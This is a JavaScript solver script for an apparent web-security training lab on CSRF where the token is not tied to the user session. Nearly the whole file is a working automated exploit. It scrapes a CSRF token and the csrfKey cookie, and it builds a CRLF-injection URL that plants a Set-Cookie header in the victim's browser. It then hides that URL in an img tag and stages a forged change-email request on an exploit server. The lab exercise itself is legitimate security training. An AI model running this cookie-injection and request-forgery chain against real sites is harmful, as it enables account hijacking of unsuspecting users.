import { parse } from "node-html-parser";
import { ExploitServer } from "../../../utils/exploitServer.js";
import { getParsedInput } from "../../../utils/getParsedInput.js";
import { runTasks } from "../../../utils/runTasks.js";
import { createExploit } from "../utils/createExploit.js";

const { url, httpClient } = getParsedInput({
  description: "Lab: CSRF where token is not tied to user session",
  proxy: true,
});

async function task() {
  const exploit = await getExploit();
  const exploitServer = await ExploitServer.create(url, httpClient);
  await exploitServer.storeExploit(exploit);

  console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);
}

runTasks([task]);

async function getExploit() {
  const exploitFilePath = new URL("./exploit.html", import.meta.url);
  const response = await httpClient.get(url + "login");
  const csrfToken = extractCsrfToken(response.data);
  const csrfKey = extractCsrfKey(response);
  const cookieExploitUrl = getCookieExploitUrl(csrfKey);
  const actionUrl = url + "my-account/change-email";
  let exploit = await createExploit(exploitFilePath, { actionUrl, csrfToken });
  exploit = setCookieExploitUrl(exploit, cookieExploitUrl);
  return exploit;
}

function extractCsrfToken(html) {
  const root = parse(html);
  const elem = root.querySelector(".login-form input[name='csrf']");
  return elem.getAttribute("value");
}

function extractCsrfKey(response) {
  return extractCookie(response, "csrfKey");
}

function extractCookie(response, cookieName) {
  const regex = new RegExp(`${cookieName}=(.+?)(?:;|$)`);
  const cookies = response.headers["set-cookie"];
  let value = null;
  for (const cookie of cookies) {
    let match = cookie.match(regex);
    if (match) {
      value = match[1];
      break;
    }
  }
  return value;
}

function getCookieExploitUrl(csrfKey) {
  const cookieExploit = encodeURI(
    `?search=\r\nSet-Cookie:csrfKey=${csrfKey};SameSite=None;Secure`,
  );
  return url + cookieExploit;
}

function setCookieExploitUrl(exploit, cookieExploitUrl) {
  const html = parse(exploit);
  const img = html.querySelector("img");
  img.setAttribute("src", cookieExploitUrl);
  return html.toString();
}
